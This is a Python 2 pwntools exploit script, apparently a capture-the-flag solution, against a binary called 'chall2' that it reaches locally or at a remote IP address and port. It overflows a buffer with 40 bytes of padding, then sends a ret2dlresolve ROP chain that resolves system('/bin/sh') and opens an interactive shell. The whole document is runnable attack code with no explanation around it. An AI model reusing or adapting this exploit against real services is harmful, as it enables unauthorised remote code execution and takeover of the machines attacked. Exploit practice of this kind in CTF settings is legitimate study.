```python
#!/usr/bin/python2
from pwn import *
from sys import *

context.arch = "amd64"
# context.arch = "i386"

e = ELF('chall2')
if(len(argv) == 2):
    p = connect("193.57.159.27", 46343)
else:
    p = process('chall2')

print pidof(p)[0]


import pyperclip
pyperclip.copy('attach {}'.format(pidof(p)[0]))
context.arch = "amd64"
context.terminal = ['tmux', 'split-window', '-h']

cmd = """
b *0x0000000000401192
"""
if(len(argv) == 3):
    gdb.attach(p, cmd)

pload = ""
pload += "A" * 0x20
pload += "A" * 8

rop = ROP(e)
dlresolve = Ret2dlresolvePayload(e, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
print(rop.dump())

pload += raw_rop

p.sendline(pload)
pause()
p.sendline(dlresolve.payload)
pause()

p.interactive()
```